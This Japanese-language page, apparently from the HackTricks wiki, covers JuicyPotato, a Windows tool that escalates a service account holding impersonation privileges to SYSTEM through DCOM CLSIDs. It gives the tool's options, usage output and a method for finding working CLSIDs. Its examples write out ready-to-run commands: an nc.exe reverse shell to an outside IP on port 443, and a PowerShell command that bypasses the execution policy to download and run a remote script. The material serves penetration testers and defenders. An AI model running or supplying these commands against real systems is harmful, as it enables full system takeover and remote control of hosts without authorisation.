# JuicyPotato

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを送信してください。**

</details>
{% endhint %}

{% hint style="warning" %}
**JuicyPotatoは** Windows Server 2019およびWindows 10ビルド1809以降では動作しません。ただし、[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**、**[**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**、**[**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)を使用して、**同じ特権を利用し、`NT AUTHORITY\SYSTEM`**レベルのアクセスを取得できます。_**確認してください：**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (ゴールデン特権の悪用) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_少しのジュースを加えた_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG) _の甘いバージョン、つまり**WindowsサービスアカウントからNT AUTHORITY\SYSTEMへの別のローカル特権昇格ツール**_

#### juicypotatoは[https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)からダウンロードできます

### 概要 <a href="#summary" id="summary"></a>

[**juicy-potatoのReadmeから**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)およびその[バリアント](https://github.com/decoder-it/lonelypotato)は、[`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [サービス](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126)に基づく特権昇格チェーンを利用し、`127.0.0.1:6666`でMiTMリスナーを持ち、`SeImpersonate`または`SeAssignPrimaryToken`特権を持っている場合に機能します。Windowsビルドレビュー中に、`BITS`が意図的に無効にされ、ポート`6666`が使用されている設定を見つけました。

私たちは[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)を武器化することに決めました：**Juicy Potatoにこんにちはを言いましょう**。

> 理論については、[Rotten Potato - サービスアカウントからSYSTEMへの特権昇格](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)を参照し、リンクと参考文献のチェーンをたどってください。

私たちは、`BITS`以外にも悪用できるCOMサーバーがいくつかあることを発見しました。それらは次の条件を満たす必要があります：

1. 現在のユーザーによってインスタンス化可能であること、通常は特権を持つ「サービスユーザー」
2. `IMarshal`インターフェースを実装していること
3. 高い権限のユーザー（SYSTEM、Administratorなど）として実行されること

いくつかのテストの後、私たちは複数のWindowsバージョンで[興味深いCLSIDのリスト](http://ohpe.it/juicy-potato/CLSID/)を取得し、テストしました。

### ジューシーな詳細 <a href="#juicy-details" id="juicy-details"></a>

JuicyPotatoを使用すると：

* **ターゲットCLSID** _任意のCLSIDを選択できます。_ [_こちら_](http://ohpe.it/juicy-potato/CLSID/) _でOS別に整理されたリストを見つけることができます。_
* **COMリスニングポート** _好みのCOMリスニングポートを定義します（ハードコーディングされた6666の代わりに）_
* **COMリスニングIPアドレス** _任意のIPにサーバーをバインドします_
* **プロセス作成モード** _偽装されたユーザーの特権に応じて、次のいずれかを選択できます：_
* `CreateProcessWithToken`（`SeImpersonate`が必要）
* `CreateProcessAsUser`（`SeAssignPrimaryToken`が必要）
* `両方`
* **起動するプロセス** _エクスプロイトが成功した場合に実行する実行可能ファイルまたはスクリプト_
* **プロセス引数** _起動するプロセスの引数をカスタマイズします_
* **RPCサーバーアドレス** _ステルスアプローチのために、外部RPCサーバーに認証できます_
* **RPCサーバーポート** _外部サーバーに認証したい場合に便利で、ファイアウォールがポート`135`をブロックしている場合…_
* **テストモード** _主にテスト目的、つまりCLSIDのテスト。DCOMを作成し、トークンのユーザーを表示します。テストについては_ [_こちらを参照_](http://ohpe.it/juicy-potato/Test/)

### 使用法 <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 最後の考え <a href="#final-thoughts" id="final-thoughts"></a>

[**juicy-potatoのReadmeから**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

ユーザーが `SeImpersonate` または `SeAssignPrimaryToken` 権限を持っている場合、あなたは **SYSTEM** です。

これらのCOMサーバーの悪用を防ぐことはほぼ不可能です。`DCOMCNFG` を介してこれらのオブジェクトの権限を変更することを考えるかもしれませんが、うまくいくことは難しいでしょう。

実際の解決策は、`* SERVICE` アカウントの下で実行される敏感なアカウントとアプリケーションを保護することです。`DCOM` を停止することは確かにこのエクスプロイトを抑制しますが、基盤となるOSに深刻な影響を与える可能性があります。

出典: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## 例

注意: 試すためのCLSIDのリストは[こちらのページ](https://ohpe.it/juicy-potato/CLSID/)を訪れてください。

### nc.exeリバースシェルを取得する
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### 新しいCMDを起動する（RDPアクセスがある場合）

![](<../../.gitbook/assets/image (300).png>)

## CLSIDの問題

多くの場合、JuicyPotatoが使用するデフォルトのCLSIDは**機能しない**ため、エクスプロイトが失敗します。通常、**動作するCLSID**を見つけるには複数の試行が必要です。特定のオペレーティングシステムで試すためのCLSIDのリストを取得するには、このページを訪問してください：

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **CLSIDの確認**

まず、juicypotato.exe以外のいくつかの実行可能ファイルが必要です。

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)をダウンロードしてPSセッションに読み込み、[GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)をダウンロードして実行します。そのスクリプトはテストする可能性のあるCLSIDのリストを作成します。

次に[test_clsid.bat](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)をダウンロードし（CLSIDリストとjuicypotato実行可能ファイルへのパスを変更）、実行します。すべてのCLSIDを試し始め、**ポート番号が変更されると、それはCLSIDが機能したことを意味します**。

**-cパラメータを使用して**動作するCLSIDを**確認してください**

## 参考文献

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)


{% hint style="success" %}
AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
